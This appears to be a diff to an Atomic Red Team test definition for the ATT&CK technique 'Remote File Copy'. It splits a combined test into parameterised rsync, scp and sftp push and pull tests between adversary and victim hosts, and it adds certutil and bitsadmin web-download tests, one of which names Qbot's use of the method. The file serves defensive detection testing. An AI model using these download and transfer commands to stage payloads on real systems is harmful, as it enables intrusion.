@@ -3,45 +3,234 @@ attack_technique: T1105
 display_name: Remote File Copy
 
 atomic_tests:
-- name: rsync - scp - sftp remote file copy
+- name: rsync remote file copy (push)
   description: |
-    Utilize rsync, scp and sftp to perform a remote file copy
+    Utilize rsync to perform a remote file copy (push)
   supported_platforms:
     - linux
     - macos
+  input_arguments:
+    local_path:
+      description: Path of folder to copy
+      type: Path
+      default: /tmp/adversary-rsync/
+    username:
+      description: User account to authenticate on remote host
+      type: String
+      default: victim
+    remote_host:
+      description: Remote host to copy toward
+      type: String
+      default: victim-host
+    remote_path:
+      description: Remote path to receive rsync
+      type: Path
+      default: /tmp/victim-files
   executor:
     name: bash
     command: |
-      ### FIX: Not sure how to handle commands that need to be run on multiple systems
+      rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}
 
-      # Adversary System Configuration
-      # Ensure SSH access has been configured for an adversary account
-      echo "This file transferred by scp" > /tmp/adversary-scp
-      echo "This file transferred by sftp" > /tmp/adversary-sftp
-      mkdir /tmp/adversary-rsync
-      cd /tmp/adversary-rsync
-      touch a b c d e f g
+- name: rsync remote file copy (pull)
+  description: |
+    Utilize rsync to perform a remote file copy (pull)
+  supported_platforms:
+    - linux
+    - macos
+  input_arguments:
+    remote_path:
+      description: Path of folder to copy
+      type: Path
+      default: /tmp/adversary-rsync/
+    username:
+      description: User account to authenticate on remote host
+      type: String
+      default: adversary
+    remote_host:
+      description: Remote host to copy from
+      type: String
+      default: adversary-host
+    local_path:
+      description: Local path to receive rsync
+      type: Path
+      default: /tmp/victim-files
+  executor:
+    name: bash
+    command: |
+      rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}
 
-      # Victim System Configuration
-      # Ensure SSH access has been configured for a victim account
-      # Ensure write access for victim account to this directory
-      mkdir /tmp/victim-files
-      cd /tmp/victim-files
+- name: scp remote file copy (push)
+  description: |
+    Utilize scp to perform a remote file copy (push)
+  supported_platforms:
+    - linux
+    - macos
+  input_arguments:
+    local_file:
+      description: Path of file to copy
+      type: Path
+      default: /tmp/adversary-scp
+    username:
+      description: User account to authenticate on remote host
+      type: String
+      default: victim
+    remote_host:
+      description: Remote host to copy toward
+      type: String
+      default: victim-host
+    remote_path:
+      description: Remote path to receive scp
+      type: Path
+      default: /tmp/victim-files/
+  executor:
+    name: bash
+    command: |
+      scp #{local_file} #{username}@#{remote_host}:#{remote_path}
 
-      # Push files to victim using rsync
-      rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files/
+- name: scp remote file copy (pull)
+  description: |
+    Utilize scp to perform a remote file copy (pull)
+  supported_platforms:
+    - linux
+    - macos
+  input_arguments:
+    remote_file:
+      description: Path of file to copy
+      type: Path
+      default: /tmp/adversary-scp
+    username:
+      description: User account to authenticate on remote host
+      type: String
+      default: adversary
+    remote_host:
+      description: Remote host to copy from
+      type: String
+      default: adversary-host
+    local_path:
+      description: Local path to receive scp
+      type: Path
+      default: /tmp/victim-files/
+  executor:
+    name: bash
+    command: |
+      scp #{username}@#{remote_host}:#{remote_file} #{local_path}
 
-      # Pull files from adversary using rsync
-      rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files/
+- name: sftp remote file copy (push)
+  description: |
+    Utilize sftp to perform a remote file copy (push)
+  supported_platforms:
+    - linux
+    - macos
+  input_arguments:
+    local_file:
+      description: Path of file to copy
+      type: Path
+      default: /tmp/adversary-sftp
+    username:
+      description: User account to authenticate on remote host
+      type: String
+      default: victim
+    remote_host:
+      description: Remote host to copy toward
+      type: String
+      default: victim-host
+    remote_path:
+      description: Remote path to receive sftp
+      type: Path
+      default: /tmp/victim-files/
+  executor:
+    name: bash
+    command: |
+      sftp #{username}@#{remote_host}:#{remote_path} <<< $'put #{local_file}'
 
-      # Push files to victim using scp
-      scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/
+- name: sftp remote file copy (pull)
+  description: |
+    Utilize sftp to perform a remote file copy (pull)
+  supported_platforms:
+    - linux
+    - macos
+  input_arguments:
+    remote_file:
+      description: Path of file to copy
+      type: Path
+      default: /tmp/adversary-sftp
+    username:
+      description: User account to authenticate on remote host
+      type: String
+      default: adversary
+    remote_host:
+      description: Remote host to copy from
+      type: String
+      default: adversary-host
+    local_path:
+      description: Local path to receive sftp
+      type: Path
+      default: /tmp/victim-files/
+  executor:
+    name: bash
+    command: |
+      sftp #{username}@#{remote_host}:#{remote_file} #{local_path}
+- name: certutil download (urlcache)
+  description: |
+    Use certutil -urlcache argument to download a file from the web. Note - /urlcache also works!
+  supported_platforms:
+    - windows
+  input_arguments:
+    remote_file:
+      description: URL of file to copy
+      type: Url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+    local_path:
+      description: Local path to place file
+      type: Path
+      default: Atomic-license.txt
+  executor:
+    name: command_prompt
+    command: |
+      cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
+- name: certutil download (verifyctl)
+  description: |
+    Use certutil -verifyctl argument to download a file from the web. Note - /verifyctl also works!
+  supported_platforms:
+    - windows
+  input_arguments:
+    remote_file:
+      description: URL of file to copy
+      type: Url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+    local_path:
+      description: Local path to place file
+      type: Path
+      default: Atomic-license.txt
+  executor:
+    name: powershell
+    command: |
+      $datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)"
+      New-Item -Path $datePath -ItemType Directory
+      Set-Location $datePath
+      certutil -verifyctl -split -f #{remote_file}
+      Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }
 
-      # Pull file from adversary using scp
-      scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/scp-file
-
-      # Push files to victim using sftp
-      sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp'
-
-      # Pull file from adversary using sftp
-      sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/sftp-file
+- name: Windows - BITSAdmin BITS Download
+  description: |
+    This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.
+    This technique is used by Qbot malware to download payloads.
+  supported_platforms:
+    - windows
+  input_arguments:
+    bits_job_name:
+      description: Name of the created BITS job
+      type: String
+      default: qcxjb7
+    remote_file:
+      description: URL of file to copy
+      type: Url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+    local_path:
+      description: Local path to place file
+      type: Path
+      default: Atomic-license.txt
+  executor:
+    name: command_prompt
+    command: |
+      C:\Windows\System32\bitsadmin.exe /transfer #{bits_job_name} /Priority HIGH #{remote_file} #{local_path}
